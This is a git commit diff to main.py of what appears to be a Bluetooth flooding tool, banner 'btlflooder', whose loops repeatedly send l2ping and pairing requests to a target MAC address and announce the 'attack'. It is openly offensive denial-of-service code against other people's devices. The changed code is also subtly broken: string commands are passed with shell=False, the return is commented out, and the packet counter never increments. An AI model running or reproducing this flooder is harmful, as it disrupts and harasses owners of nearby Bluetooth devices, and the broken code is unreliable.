c176b963cf0f84a557d2b11c51cab5932e0b18b1
Lewis Elliott <115668353+widow9098-dev@users.noreply.github.com>
2022-11-04 09:33:32 +0000

    pissssssss

--- main.py
+++ main.py
@@ -5,9 +5,9 @@ import subprocess
 import time
 import threading
 def run_cmd(command: str):
-        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        process = subprocess.Popen(command, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         stdout, stderr = process.communicate()
-        return stdout.decode("utf-8")
+        #return stdout.decode("utf-8")
 print("___.    __  .__      _____.__                    .___            \n\\_ |___/  |_|  |   _/ ____\\  |   ____   ____   __| _/___________ \n | __ \\   __\\  |   \\   __\\|  |  /  _ \\ /  _ \\ / __ |/ __ \\_  __ \\\n | \\_\\ \\  | |  |__  |  |  |  |_(  <_> |  <_> ) /_/ \\  ___/|  | \\/\n |___  /__| |____/  |__|  |____/\\____/ \\____/\\____ |\\___  >__|   \n     \\/                                           \\/    \\/       ")
 print("widow9098#0353")
 try: cmd = sys.argv[1]
@@ -48,15 +48,18 @@ else:
             threading.Thread(target = loopbacklping).start()
     elif (method == "pair"):
         def loopback():
+            packetsent = 0
             while True:
-                hwus = run_cmd("bluetoothctl power on") 
-                hwus = run_cmd("bluetoothctl discoverable on") 
-                hwus = run_cmd("bluetoothctl pairable on") 
-                hwus = run_cmd("bluetoothctl agent on") 
-                hwus = run_cmd("bluetoothctl default-agent") 
-                hwus = run_cmd("timeout 1s bluetoothctl scan on")  
-                hwus = run_cmd("timeout 2s bluetoothctl pair " + macadd) 
+                run_cmd("bluetoothctl power on") 
+                run_cmd("bluetoothctl discoverable on") 
+                run_cmd("bluetoothctl pairable on") 
+                run_cmd("bluetoothctl agent on") 
+                run_cmd("bluetoothctl default-agent") 
+                run_cmd("timeout 1s bluetoothctl scan on")  
+                run_cmd("timeout 2s bluetoothctl pair " + macadd) 
+                run_cmd("clear")
                 print("sent pair packet to " + macadd)
+                print("sent " + str(packetsent) + " packets")
         print("running " + method + " attack on " + macadd)
         threading.Thread(target = loopback).start()
     else:
